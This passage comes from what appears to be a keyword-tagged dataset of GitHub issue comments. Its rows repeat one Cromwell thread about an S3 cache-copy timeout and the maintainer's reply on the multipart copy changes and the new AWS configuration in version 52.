BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:325,Modifiability,config,configuration,325,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:724,Modifiability,config,config,724,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:48,Performance,perform,perform,48,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:132,Performance,cache,cached,132,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:582,Performance,cache,cache,582,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:611,Performance,cache,cache,611,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:693,Performance,cache,cache,693,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:747,Performance,tune,tune,747,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:888,Performance,cache,cache,888,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:1043,Performance,Cache,Cache,1043,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:1586,Performance,cache,cacheCopy,1586,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:557,Safety,timeout,timeout,557,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:1021,Safety,Timeout,TimeoutException,1021,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:861,Testability,log,log,861,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > 